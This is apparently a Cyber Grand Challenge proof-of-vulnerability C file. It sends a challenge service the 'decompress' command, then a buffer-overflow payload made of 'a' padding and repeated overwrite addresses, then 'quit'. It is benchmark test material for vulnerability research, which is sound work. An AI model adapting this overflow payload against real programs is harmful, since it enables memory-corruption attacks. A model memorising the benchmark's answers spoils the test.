#include "libpov.h"
int main(int cgc_argc, char *cgc_argv[]) {
   cgc_negotiate_type1(0x0, 0x0, 0);
   do {
      //*** writing data
      static unsigned char write_00000_00000[] = 
         "\x64\x65\x63\x6f\x6d\x70\x72\x65\x73\x73\x0a";
      static unsigned int write_00000_00000_len = 11;
      unsigned char *write_00000 = NULL;
      unsigned int write_00000_len = 0;
      write_00000 = cgc_append_buf(write_00000, &write_00000_len, write_00000_00000, write_00000_00000_len);
      if (write_00000_len > 0) {
         cgc_transmit_all(1, write_00000, write_00000_len);
      }
      cgc_free(write_00000);
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00001_00000[] = 
         "\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61"
         "\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61"
         "\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61"
         "\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61"
         "\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61"
         "\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x8f"
         "\xff\x00\x08\x8f\xff\x00\x08\x8f\xff\x00\x08\x8f\xff\x00\x08\x8f"
         "\xff\x00\x08\x8f\xff\x00\x08\x8f\xff\x00\x08\x8f\xff\x00\x08\x8f"
         "\xff\x00\x08\x8f\xff\x00\x08\x8f\xff\x00\x08\x8f\xff\x00\x08\x8f"
         "\xff\x00\x08\x8f\xff\x00\x08\x8f\xff\x00\x08\x8f\xff\x00\x08\x8f"
         "\xff\x00\x08\x8f\xff\x00\x08\x8f\xff\x00\x08\x8f\xff\x00\x08\x8f"
         "\xff\x00\x08\x8f\xff\x00\x08\x8f\xff\x00\x08\x8f\xff\x00\x08\xed"
         "\xac\xed\xde\x0a";
      static unsigned int write_00001_00000_len = 196;
      unsigned char *write_00001 = NULL;
      unsigned int write_00001_len = 0;
      write_00001 = cgc_append_buf(write_00001, &write_00001_len, write_00001_00000, write_00001_00000_len);
      if (write_00001_len > 0) {
         cgc_transmit_all(1, write_00001, write_00001_len);
      }
      cgc_free(write_00001);
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00002_00000[] = 
         "\x71\x75\x69\x74\x0a";
      static unsigned int write_00002_00000_len = 5;
      unsigned char *write_00002 = NULL;
      unsigned int write_00002_len = 0;
      write_00002 = cgc_append_buf(write_00002, &write_00002_len, write_00002_00000, write_00002_00000_len);
      if (write_00002_len > 0) {
         cgc_transmit_all(1, write_00002, write_00002_len);
      }
      cgc_free(write_00002);
   } while (0);
}
